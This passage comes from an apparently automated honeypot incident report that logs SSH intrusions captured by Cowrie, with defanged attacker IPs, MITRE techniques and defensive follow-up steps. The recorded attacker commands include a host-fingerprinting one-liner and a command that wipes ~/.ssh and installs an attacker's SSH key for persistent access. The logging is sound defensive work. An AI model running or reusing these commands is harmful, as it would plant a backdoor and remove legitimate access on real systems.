| `2026-08-05 14:12:38` | `cowrie.command.input` |
| `2026-08-05 14:12:39` | `cowrie.log.closed` |
| `2026-08-05 14:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6366865c3fd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:14 |
| **Last Seen** | 2026-08-05 14:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:14:13` | `cowrie.session.connect` |
| `2026-08-05 14:14:13` | `cowrie.client.version` |
| `2026-08-05 14:14:13` | `cowrie.client.kex` |
| `2026-08-05 14:14:14` | `cowrie.login.success` |
| `2026-08-05 14:14:15` | `cowrie.session.params` |
| `2026-08-05 14:14:15` | `cowrie.command.input` |
| `2026-08-05 14:14:15` | `cowrie.command.input` |
| `2026-08-05 14:14:15` | `cowrie.command.input` |
| `2026-08-05 14:14:15` | `cowrie.command.input` |
| `2026-08-05 14:14:15` | `cowrie.command.input` |
| `2026-08-05 14:14:15` | `cowrie.command.success` |
| `2026-08-05 14:14:15` | `cowrie.command.input` |
| `2026-08-05 14:14:15` | `cowrie.command.input` |
| `2026-08-05 14:14:15` | `cowrie.command.input` |
| `2026-08-05 14:14:15` | `cowrie.command.input` |
| `2026-08-05 14:14:16` | `cowrie.log.closed` |
| `2026-08-05 14:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bc37a8090d5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:15 |
| **Last Seen** | 2026-08-05 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:15:54` | `cowrie.session.connect` |
| `2026-08-05 14:15:54` | `cowrie.client.version` |
| `2026-08-05 14:15:54` | `cowrie.client.kex` |
| `2026-08-05 14:15:55` | `cowrie.login.success` |
| `2026-08-05 14:15:55` | `cowrie.session.params` |
| `2026-08-05 14:15:55` | `cowrie.command.input` |
| `2026-08-05 14:15:55` | `cowrie.command.input` |
| `2026-08-05 14:15:55` | `cowrie.command.input` |
| `2026-08-05 14:15:55` | `cowrie.command.input` |
| `2026-08-05 14:15:55` | `cowrie.command.input` |
| `2026-08-05 14:15:55` | `cowrie.command.success` |
| `2026-08-05 14:15:55` | `cowrie.command.input` |
| `2026-08-05 14:15:55` | `cowrie.command.input` |
| `2026-08-05 14:15:55` | `cowrie.command.input` |
| `2026-08-05 14:15:55` | `cowrie.command.input` |
| `2026-08-05 14:15:56` | `cowrie.log.closed` |
| `2026-08-05 14:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70392150d0ff

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:17 |
| **Last Seen** | 2026-08-05 14:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:17:33` | `cowrie.session.connect` |
| `2026-08-05 14:17:33` | `cowrie.client.version` |
| `2026-08-05 14:17:33` | `cowrie.client.kex` |
| `2026-08-05 14:17:34` | `cowrie.login.success` |
| `2026-08-05 14:17:35` | `cowrie.session.params` |
| `2026-08-05 14:17:35` | `cowrie.command.input` |
| `2026-08-05 14:17:35` | `cowrie.command.input` |
| `2026-08-05 14:17:35` | `cowrie.command.input` |
| `2026-08-05 14:17:35` | `cowrie.command.input` |
| `2026-08-05 14:17:35` | `cowrie.command.input` |
| `2026-08-05 14:17:35` | `cowrie.command.success` |
| `2026-08-05 14:17:35` | `cowrie.command.input` |
| `2026-08-05 14:17:35` | `cowrie.command.input` |
| `2026-08-05 14:17:35` | `cowrie.command.input` |
| `2026-08-05 14:17:35` | `cowrie.command.input` |
| `2026-08-05 14:17:35` | `cowrie.log.closed` |
| `2026-08-05 14:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88167a583450

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]182` |
| **First Seen** | 2026-08-05 14:18 |
| **Last Seen** | 2026-08-05 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:18:00` | `cowrie.session.connect` |
| `2026-08-05 14:18:00` | `cowrie.client.version` |
| `2026-08-05 14:18:00` | `cowrie.client.kex` |
| `2026-08-05 14:18:01` | `cowrie.login.success` |
| `2026-08-05 14:18:01` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:18:01` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]182` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6b85001e084

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:18 |
| **Last Seen** | 2026-08-05 14:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:18:54` | `cowrie.session.connect` |
| `2026-08-05 14:18:54` | `cowrie.client.version` |
| `2026-08-05 14:18:54` | `cowrie.client.kex` |
| `2026-08-05 14:18:55` | `cowrie.login.success` |
| `2026-08-05 14:18:56` | `cowrie.session.params` |
| `2026-08-05 14:18:56` | `cowrie.command.input` |
| `2026-08-05 14:18:56` | `cowrie.command.input` |
| `2026-08-05 14:18:56` | `cowrie.command.input` |
| `2026-08-05 14:18:56` | `cowrie.command.input` |
| `2026-08-05 14:18:56` | `cowrie.command.input` |
| `2026-08-05 14:18:56` | `cowrie.command.success` |
| `2026-08-05 14:18:56` | `cowrie.command.input` |
| `2026-08-05 14:18:56` | `cowrie.command.input` |
| `2026-08-05 14:18:56` | `cowrie.command.input` |
| `2026-08-05 14:18:56` | `cowrie.command.input` |
| `2026-08-05 14:18:57` | `cowrie.log.closed` |
| `2026-08-05 14:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aea809c698a2

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-08-05 14:19 |
| **Last Seen** | 2026-08-05 14:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:19:49` | `cowrie.session.connect` |
| `2026-08-05 14:19:49` | `cowrie.client.version` |
| `2026-08-05 14:19:49` | `cowrie.client.kex` |
| `2026-08-05 14:19:51` | `cowrie.login.success` |
| `2026-08-05 14:19:52` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d457f395ef4

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-08-05 14:19 |
| **Last Seen** | 2026-08-05 14:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:19:58` | `cowrie.session.connect` |
| `2026-08-05 14:19:59` | `cowrie.client.version` |
| `2026-08-05 14:19:59` | `cowrie.client.kex` |
| `2026-08-05 14:20:04` | `cowrie.login.success` |
| `2026-08-05 14:20:05` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:20:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7329ad6d48

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]19` |
| **First Seen** | 2026-08-05 14:20 |
| **Last Seen** | 2026-08-05 14:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:20:47` | `cowrie.session.connect` |
| `2026-08-05 14:20:47` | `cowrie.client.version` |
| `2026-08-05 14:20:47` | `cowrie.client.kex` |
| `2026-08-05 14:20:47` | `cowrie.login.success` |
| `2026-08-05 14:20:49` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:20:49` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:20:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]19` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc8f7aa174b8

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]182` |
| **First Seen** | 2026-08-05 14:22 |
| **Last Seen** | 2026-08-05 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:22:05` | `cowrie.session.connect` |
| `2026-08-05 14:22:05` | `cowrie.client.version` |
| `2026-08-05 14:22:05` | `cowrie.client.kex` |
| `2026-08-05 14:22:06` | `cowrie.login.success` |
| `2026-08-05 14:22:06` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:22:06` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]182` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5881c049bdaa

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-08-05 14:29 |
| **Last Seen** | 2026-08-05 14:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:29:43` | `cowrie.session.connect` |
| `2026-08-05 14:29:43` | `cowrie.client.version` |
| `2026-08-05 14:29:43` | `cowrie.client.kex` |
| `2026-08-05 14:29:44` | `cowrie.login.success` |
| `2026-08-05 14:29:44` | `cowrie.session.params` |
| `2026-08-05 14:29:44` | `cowrie.command.input` |
| `2026-08-05 14:29:44` | `cowrie.command.failed` |
| `2026-08-05 14:29:45` | `cowrie.log.closed` |
| `2026-08-05 14:29:46` | `cowrie.session.params` |
| `2026-08-05 14:29:46` | `cowrie.command.input` |
| `2026-08-05 14:29:46` | `cowrie.session.file_download` |
| `2026-08-05 14:29:46` | `cowrie.log.closed` |
| `2026-08-05 14:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9738f761185f

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-08-05 14:29 |
| **Last Seen** | 2026-08-05 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:29:46` | `cowrie.session.connect` |
| `2026-08-05 14:29:46` | `cowrie.client.version` |
| `2026-08-05 14:29:46` | `cowrie.client.kex` |
| `2026-08-05 14:29:47` | `cowrie.login.success` |
| `2026-08-05 14:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e46eec3ad7b3

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-08-05 14:29 |
| **Last Seen** | 2026-08-05 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:29:47` | `cowrie.session.connect` |
| `2026-08-05 14:29:47` | `cowrie.client.version` |
| `2026-08-05 14:29:47` | `cowrie.client.kex` |
| `2026-08-05 14:29:48` | `cowrie.login.success` |
| `2026-08-05 14:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-883b33b89958

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]223` |
| **First Seen** | 2026-08-05 14:31 |
| **Last Seen** | 2026-08-05 14:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:31:57` | `cowrie.session.connect` |
| `2026-08-05 14:31:57` | `cowrie.client.version` |
| `2026-08-05 14:31:57` | `cowrie.client.kex` |
| `2026-08-05 14:31:58` | `cowrie.login.success` |
| `2026-08-05 14:31:58` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:31:59` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]223` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de64aa1e5567

| Field | Detail |
|---|---|
| **Source IP** | `125.124.183[.]254` |
| **First Seen** | 2026-08-05 14:36 |
| **Last Seen** | 2026-08-05 14:40 |
| **Session Duration** | 225s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:36:48` | `cowrie.session.connect` |
| `2026-08-05 14:36:48` | `cowrie.client.version` |
| `2026-08-05 14:36:49` | `cowrie.client.kex` |
| `2026-08-05 14:36:50` | `cowrie.login.success` |
| `2026-08-05 14:36:51` | `cowrie.session.params` |
| `2026-08-05 14:36:51` | `cowrie.command.input` |
| `2026-08-05 14:36:51` | `cowrie.command.failed` |
| `2026-08-05 14:36:51` | `cowrie.log.closed` |
| `2026-08-05 14:36:52` | `cowrie.session.params` |
| `2026-08-05 14:36:52` | `cowrie.command.input` |
| `2026-08-05 14:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.124.183[.]254` to AbuseIPDB if not already reported
- [ ] Block `125.124.183[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76bef520a1d

| Field | Detail |
|---|---|
| **Source IP** | `120.234.195[.]41` |
| **First Seen** | 2026-08-05 14:38 |
| **Last Seen** | 2026-08-05 14:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:38:24` | `cowrie.session.connect` |
| `2026-08-05 14:38:25` | `cowrie.client.version` |
| `2026-08-05 14:38:25` | `cowrie.client.kex` |
| `2026-08-05 14:38:27` | `cowrie.login.success` |
| `2026-08-05 14:38:28` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:38:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.195[.]41` to AbuseIPDB if not already reported
- [ ] Block `120.234.195[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1b9fb1f959b

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-08-05 14:38 |
| **Last Seen** | 2026-08-05 14:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:38:37` | `cowrie.session.connect` |
| `2026-08-05 14:38:38` | `cowrie.client.version` |
| `2026-08-05 14:38:38` | `cowrie.client.kex` |
| `2026-08-05 14:38:40` | `cowrie.login.success` |
| `2026-08-05 14:38:41` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2db9f8871e36

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]227` |
| **First Seen** | 2026-08-05 14:42 |
| **Last Seen** | 2026-08-05 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:42:47` | `cowrie.session.connect` |
| `2026-08-05 14:42:47` | `cowrie.client.version` |
| `2026-08-05 14:42:47` | `cowrie.client.kex` |
| `2026-08-05 14:42:48` | `cowrie.login.success` |
| `2026-08-05 14:42:48` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:42:48` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]227` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0667adcd6a9

| Field | Detail |
|---|---|
| **Source IP** | `130.12.181[.]23` |
| **First Seen** | 2026-08-05 14:44 |
| **Last Seen** | 2026-08-05 14:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:44:24` | `cowrie.session.connect` |
| `2026-08-05 14:44:24` | `cowrie.client.version` |
| `2026-08-05 14:44:25` | `cowrie.client.kex` |
| `2026-08-05 14:44:25` | `cowrie.login.success` |
| `2026-08-05 14:44:25` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:44:25` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:44:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.181[.]23` to AbuseIPDB if not already reported
- [ ] Block `130.12.181[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a897cb77b19

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]230` |
| **First Seen** | 2026-08-05 14:47 |
| **Last Seen** | 2026-08-05 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:47:49` | `cowrie.session.connect` |
| `2026-08-05 14:47:49` | `cowrie.client.version` |
| `2026-08-05 14:47:49` | `cowrie.client.kex` |
| `2026-08-05 14:47:50` | `cowrie.login.success` |
| `2026-08-05 14:47:50` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:47:50` | `cowrie.direct-tcpip.data` |
